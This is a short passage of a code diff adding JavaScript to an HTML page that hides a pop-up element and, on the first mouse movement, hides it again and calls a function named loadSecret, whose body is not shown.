+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
   </script>
 </body>
 </html>
